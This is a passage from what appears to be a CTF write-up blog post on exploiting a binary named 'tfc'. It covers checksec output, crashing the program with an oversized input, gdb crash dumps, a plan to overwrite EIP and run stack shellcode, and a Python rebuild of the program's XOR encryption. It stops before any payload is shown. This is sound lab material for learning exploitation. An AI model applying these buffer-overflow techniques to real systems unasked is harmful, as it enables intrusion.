</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : disabled
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span></code></pre></td></tr></table></div></figure>


<p>Woa. <strong>No</strong> security? Ok&hellip;</p>

<h2>we knocked and tfc opened the door to bof</h2>

<p>The disassembly of <code>tfc</code> did not exactly point out any specific failures immediately either. Mainly due to my complete noobness. :)</p>

<p>So, I had the idea to check how it handles large files. And by large I mean to gradually increase the size of the file to be encrypted, starting with like 2MB. So I started to test this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># create a file of roughly 2MB</span>
</span><span class='line'>root@kali:~# dd <span class="k">if</span><span class="o">=</span>/dev/urandom <span class="nv">of</span><span class="o">=</span>large.tfc <span class="nv">bs</span><span class="o">=</span>1M <span class="nv">count</span><span class="o">=</span>2
</span><span class='line'>2+0 records in
</span><span class='line'>2+0 records out
</span><span class='line'>2097152 bytes <span class="o">(</span>2.1 MB<span class="o">)</span> copied, 0.132812 s, 15.8 MB/s
</span><span class='line'>
</span><span class='line'><span class="c"># confirm the size of the file</span>
</span><span class='line'>root@kali:~# ls -lh large.tfc
</span><span class='line'>-rw-r--r-- 1 root root 2.0M Oct 14 15:01 large.tfc
</span><span class='line'>
</span><span class='line'><span class="c"># check how many characters we have in the file</span>
</span><span class='line'>root@kali:~# wc -c large.tfc
</span><span class='line'>2097152 large.tfc
</span><span class='line'>
</span><span class='line'><span class="c"># attempt encryption</span>
</span><span class='line'>root@kali:~# ./tfc large.tfc out.tfc
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p><em>Segmentation fault</em>! Being able to crash <code>tfc</code> is really good news. I went on to test just how many characters were needed to crash <code>tfc</code> in a easily reproducible way, and it came down to something like 6000 characters were doing the job just fine. So, it was time to inspect this crash in <code>gdb</code>. I first prepared a new file with just &ldquo;A&rdquo; in it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# <span class="nb">echo</span> -n <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*6000&#39;</span><span class="k">)</span> &gt; gdb-test.tfc
</span></code></pre></td></tr></table></div></figure>


<p>And continued to run it in <code>gdb</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./tfc
</span><span class='line'>Reading symbols from /root/tfc...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>r gdb-test.tfc gdb-test-out.tfc
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x0
</span><span class='line'>EBX: 0xb7fbfff4 --&gt; 0x14bd7c
</span><span class='line'>ECX: 0xffffffc8
</span><span class='line'>EDX: 0x9 <span class="o">(</span><span class="s1">&#39;\t&#39;</span><span class="o">)</span>
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0xc55193b
</span><span class='line'>ESP: 0xbffff3c0 <span class="o">(</span><span class="s2">&quot;_dv(\002\250C^zƜ=\214`P@JH\\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\&quot;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o&quot;</span>...<span class="o">)</span>
</span><span class='line'>EIP: 0x675c916
</span><span class='line'>EFLAGS: 0x10282 <span class="o">(</span>carry parity adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x675c916
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff3c0 <span class="o">(</span><span class="s2">&quot;_dv(\002\250C^zƜ=\214`P@JH\\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\&quot;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o&quot;</span>...<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xbffff3c4 --&gt; 0x5e43a802
</span><span class='line'>0008<span class="p">|</span> 0xbffff3c8 --&gt; 0x3d9cc67a
</span><span class='line'>0012<span class="p">|</span> 0xbffff3cc --&gt; 0x4050608c
</span><span class='line'>0016<span class="p">|</span> 0xbffff3d0 <span class="o">(</span><span class="s2">&quot;JH\\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\&quot;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&quot;l\311+\203˃&amp;\322t\217 &quot;</span>...<span class="o">)</span>
</span><span class='line'>0020<span class="p">|</span> 0xbffff3d4 <span class="o">(</span><span class="s2">&quot;Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\&quot;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&quot;l\311+\203˃&amp;\322t\217 BG\202\006&quot;</span>...<span class="o">)</span>
</span><span class='line'>0024<span class="p">|</span> 0xbffff3d8 --&gt; 0x5489a33c
</span><span class='line'>0028<span class="p">|</span> 0xbffff3dc --&gt; 0x3997552a
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x0675c916 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ow. Ok, so we don&rsquo;t crash with a clean <em>0x41414141</em> as one would have hoped for :( In fact, examining the stack as can be seen above, its just a bunch of crap. The encrypted file content maybe? That would be the only logical conclusion at this stage.</p>

<h2>planning a exploit</h2>

<p>So far I had what I suspected was a stack overflow, however, I suspected the overflow only occurs <strong>after</strong> the encryption function (remember <code>xcrypt</code>?) has run and wants to write the output to file (this is an assumption though).</p>

<p>Ok. So. Make sure you focus now :)</p>

<p>We have already seen earlier that if we try to re-encrypt an already encrypted file, it actually decrypts it. That means, all things considered, if we were to pass a encrypted version of our <em>A</em> buffer, we may be able to have EIP overwritten with our own values. There is one major problem with this though. We are unable to write a encrypted version of our <em>A</em> buffer as we have just observed it crash before the output is written.</p>

<p>So what does this leave us with? If we can reproduce the encryption logic in a way that we can actually write an encrypted version of our <em>A</em> buffer long enough, then we can feed that to <code>tfc</code> and hopefully have workable values. This way we may potentially be able to determine where EIP gets corrupt, and considering <code>tfc</code> had no security as part of the compilation, maybe execute some shell code on the stack.</p>

<p>Ok, so, we have a plan, but this involves reverse engineering of the encryption logic in <code>xcrypt()</code> to get started. Something I have practically 0 experience in.</p>

<h2>reversing xcrypt()</h2>

<p><em>For this part, I have to give a <strong>big</strong> high five to <a href="https://twitter.com/recrudesce">@recrudesce</a> for helping me understand parts of the pseudo code.</em></p>

<p>Right. Essentially, in order for us to better understand what exactly is happening within <code>xcrypt()</code>, we would ideally want to get some pseudo code generated from the asm. Decompiling wont give you exactly the sources for the function (and in many cases its <em>reaaaaaly</em> hard to comprehend), but it <em>really</em> helps in getting the mind to understand the flow.</p>

<p>For the pseudo code, I downloaded a demo version of <a href="http://www.hopperapp.com/">Hopper</a>. The demo has a boat load of restrictions, including a 30min session limit, however it allows the pseudo code generation, so it was fine for this use. I fired up Hopper, loaded <code>tfc</code>, located the <code>xcrypt()</code> function and slapped the Pseudo code generation button:</p>

<p><img src="https://i.imgur.com/VPUDXvo.png"></p>

<p>While looking around for pseudo code generation options, I came across the <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a> online service, which had the following image as a control flow graph for the calls in <code>xcrypt()</code>.</p>

<p><img src="https://i.imgur.com/cT7i3ob.png"></p>

<p>Armed this this graph and the pseudo code, I was ready to start writing a python version of it.</p>

<p>I started by getting a basic skeleton going for the script and working though the pseudo code line by line. Lets work through it and see what it does exactly.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="kt">int</span> <span class="n">arg0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">arg1</span><span class="p">)</span> <span class="p">{</span>
</span></code></pre></td></tr></table></div></figure>


<p>We start by declaring the fuction <code>xcrypt()</code>. <code>xcrypt()</code> takes 2 arguments. From inspecting the the parent function <code>cryptFile()</code> that calls <code>xcrypt()</code>, we can see the 2 arguments passed to <code>xcrypt()</code> is the file content and the length of the content respectively. So, <code>arg0</code> is the content and <code>arg1</code> is the content length.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">var_C</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span><span class="p">;</span>
</span><span class='line'><span class="n">var_10</span> <span class="o">=</span> <span class="n">arg_0</span><span class="p">;</span>
</span><span class='line'><span class="n">var_4</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we have 3 variable assignments occur. <code>var_C</code> is set to <code>0xea1ab19f</code>, <code>var_10</code> is set to the file content from <code>arg0</code> and <code>var_4</code> is set to 0.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">while</span> <span class="p">(</span><span class="n">arg_4</span> <span class="o">&gt;&gt;</span> <span class="mh">0x2</span> <span class="o">&gt;</span> <span class="n">var_4</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="p">(</span><span class="n">var_4</span> <span class="o">*</span> <span class="mh">0x4</span> <span class="o">+</span> <span class="n">var_10</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">var_10</span> <span class="o">+</span> <span class="n">var_4</span> <span class="o">*</span> <span class="mh">0x4</span><span class="p">)</span> <span class="o">^</span> <span class="n">var_C</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This part has one bit that may be very confusing. Comparing this to other output from say IDA and <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a>, we will see that the <code>arg_4</code> referred to here is actually the length of the content, so <code>arg1</code> then.</p>

<p>With that out the way, we see the start of a while loop for <code>arg_4 &gt;&gt; 0x2</code>, which translates to <code>len(content) &gt;&gt; 2</code>, which essentially just means <code>len(content) / 4</code>. While the output of this bitwise right shift is larger than <code>var_4</code>, which is 0 at the start, the loop will continue.</p>

<p>Once inside the loop (and this is the part that for me was the hardest!!!) we see the line <code>*(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;</code>. What helped me understand what is going on here was to understand that <code>var_10</code> (which is the content of our file) is being passed by reference. So, <code>var_4 * 4</code> is essentially <code>i*4</code> of the contents, or <code>content[i*4]</code> in python, which is the 4 bytes from <code>var_4</code>. These 4 bytes are being xored by <code>var_C</code>, replacing the original 4 bytes in <code>var_10</code>, to the new xored ones.</p>

<p>So what can we deduce then? The hardcoded base encryption key for <code>tfc</code> is <code>0xea1ab19f</code>. Cool eh! But ok lets move on.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'>        <span class="n">var_8</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
</span><span class='line'>        <span class="k">while</span> <span class="p">(</span><span class="n">var_8</span> <span class="o">&lt;=</span> <span class="mh">0x7</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">((</span><span class="n">var_C</span> <span class="o">&amp;</span> <span class="mh">0x1</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                        <span class="n">var_C</span> <span class="o">=</span> <span class="n">var_C</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'>                        <span class="n">var_C</span> <span class="o">=</span> <span class="n">var_C</span> <span class="o">^</span> <span class="mh">0x6daa1cf4</span><span class="p">;</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>                <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                        <span class="n">var_C</span> <span class="o">=</span> <span class="n">var_C</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>                <span class="n">var_8</span> <span class="o">=</span> <span class="n">var_8</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">var_4</span> <span class="o">=</span> <span class="n">var_4</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next we see the start of another loop. Remember we are still in the parent loop that is going for the length of the content. This loop is planning on passing 8 times judging from <code>while (0x0 &lt;= 0x7) {</code>.</p>

<p>Once the loop has started, we see a bitwise <code>and</code> occur that checks if the key (<code>var_C</code>) &amp; 1 does not equal 0. If it does, it does a bitwise right shift and then xors it with <code>0x6daa1cf4</code>. Why <code>0x6daa1cf4</code>? Well, should the key ever become <code>1111 1111 1111 1111</code> (in binary), then any bitshifts will have no effect. If the <code>and</code> does not result in 0, just shift the bits.</p>

<p>This occurs for 8 runs.</p>

<p>So lets sum that up. The key is permutated 8 times via bitshifts for every 4 bytes of content that gets encrypted.</p>

<p>Up to here, I had my python script pretty much nailed as I was able to replicate the encryption as is, and confirmed that decrypting it worked fine. However, if the content length was not exactly divisible by 4, the trailing bits of the content would be mangled.</p>

<p>That brings us to the final part. Rumor has it that this is the padding that occurs. Why this is at the end of the encryption logic (confirmed via multiple pseudo code generators) I don&rsquo;t know :( Maybe someone else can explain this :D I just ignored it :)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">var_14</span> <span class="o">=</span> <span class="n">arg_4</span> <span class="o">&amp;</span> <span class="mh">0xfffffffc</span><span class="p">;</span>
</span><span class='line'><span class="n">var_4</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
</span><span class='line'><span class="k">while</span> <span class="p">((</span><span class="n">arg_4</span> <span class="o">&amp;</span> <span class="mh">0x3</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">var_4</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="p">(</span><span class="kt">int8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="n">var_14</span> <span class="o">+</span> <span class="n">var_4</span><span class="p">)</span> <span class="o">=</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">var_C</span> <span class="o">^</span> <span class="o">*</span><span class="p">(</span><span class="kt">int8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="n">var_14</span> <span class="o">+</span> <span class="n">var_4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
</span><span class='line'>        <span class="n">var_C</span> <span class="o">=</span> <span class="n">var_C</span> <span class="o">&gt;&gt;</span> <span class="mh">0x8</span><span class="p">;</span>
</span><span class='line'>        <span class="n">var_4</span> <span class="o">=</span> <span class="n">var_4</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">return</span> <span class="mh">0x0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>the encryption logic replicated</h2>

<p>While I was working through the pseudo code, I was writing the python script. You will notice it replicates the pseudo code logic almost exactly, except for the fact that we are not passing the content by reference, but instead build a new string with the encrypted version of the content in it. The script resulted in:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Hopper Pseudo Code</span>
</span><span class='line'>
</span><span class='line'><span class="c"># int xcrypt(int arg0, int arg1) {</span>
</span><span class='line'><span class="c">#     var_C = 0xea1ab19f;</span>
</span><span class='line'><span class="c">#     var_10 = arg_0;</span>
</span><span class='line'><span class="c">#     var_4 = 0x0;</span>
</span><span class='line'><span class="c">#     while (arg_4 &gt;&gt; 0x2 &gt; var_4) {</span>
</span><span class='line'><span class="c">#             *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;</span>
</span><span class='line'><span class="c">#             var_8 = 0x0;</span>
</span><span class='line'><span class="c">#             while (var_8 &lt;= 0x7) {</span>
</span><span class='line'><span class="c">#                     if ((var_C &amp; 0x1) != 0x0) {</span>
</span><span class='line'><span class="c">#                             var_C = var_C &gt;&gt; 0x1;</span>
</span><span class='line'><span class="c">#                             var_C = var_C ^ 0x6daa1cf4;</span>
</span><span class='line'><span class="c">#                     }</span>
</span><span class='line'><span class="c">#                     else {</span>
</span><span class='line'><span class="c">#                             var_C = var_C &gt;&gt; 0x1;</span>
</span><span class='line'><span class="c">#                     }</span>
</span><span class='line'><span class="c">#                     var_8 = var_8 + 0x1;</span>
</span><span class='line'><span class="c">#             }</span>
</span><span class='line'><span class="c">#             var_4 = var_4 + 0x1;</span>
</span><span class='line'><span class="c">#     }</span>
</span><span class='line'><span class="c">#     var_14 = arg_4 &amp; 0xfffffffc;</span>
</span><span class='line'><span class="c">#     var_4 = 0x0;</span>
</span><span class='line'><span class="c">#     while ((arg_4 &amp; 0x3) &gt; var_4) {</span>
</span><span class='line'><span class="c">#             *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) &amp; 0xff);</span>
</span><span class='line'><span class="c">#             var_C = var_C &gt;&gt; 0x8;</span>
</span><span class='line'><span class="c">#             var_4 = var_4 + 0x1;</span>
</span><span class='line'><span class="c">#     }</span>
</span><span class='line'><span class="c">#     return 0x0;</span>
</span><span class='line'><span class="c"># }</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">length</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">encrypted</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># set the base encryption key. this mutates with each pass</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span>    <span class="c"># var_C = 0xea1ab19f;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">):</span> <span class="c"># while (arg_4 &gt;&gt; 0x2 &gt; var_4) {</span>
</span><span class='line'>        <span class="c"># apply the encryption logic as can bee seen in</span>
</span><span class='line'>        <span class="c"># *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># grab the 4 bytes we working with</span>
</span><span class='line'>        <span class="nb">bytes</span> <span class="o">=</span> <span class="n">content</span><span class="p">[</span><span class="n">word</span><span class="o">*</span><span class="mi">4</span><span class="p">:((</span><span class="n">word</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="mi">4</span><span class="p">)]</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># struct unpack_from returns a tuple, we want 0 so that</span>
</span><span class='line'>        <span class="c"># we end up with something we can xor</span>
</span><span class='line'>        <span class="n">long_to_xor</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># apply the xor, this is the actual encryption part</span>
</span><span class='line'>        <span class="n">encrypted_bytes</span> <span class="o">=</span> <span class="n">long_to_xor</span> <span class="o">^</span> <span class="n">key</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># append the 4 encrypted bytes by packing them</span>
</span><span class='line'>        <span class="n">encrypted</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span><span class="n">encrypted_bytes</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># next we run the key mutation </span>
</span><span class='line'>        <span class="k">for</span> <span class="n">mutation</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>            <span class="c"># no mutation is possible of the key is 1111 1111 1111 1111</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>                <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span><span class='line'>                <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">^</span> <span class="mh">0x6daa1cf4</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">encrypted</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># set the content that we want to encrypt</span>
</span><span class='line'>    <span class="n">content</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span><span class="mi">1000</span>
</span><span class='line'>    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">encrypted</span>
</span></code></pre></td></tr></table></div></figure>


<h2>testing the script</h2>

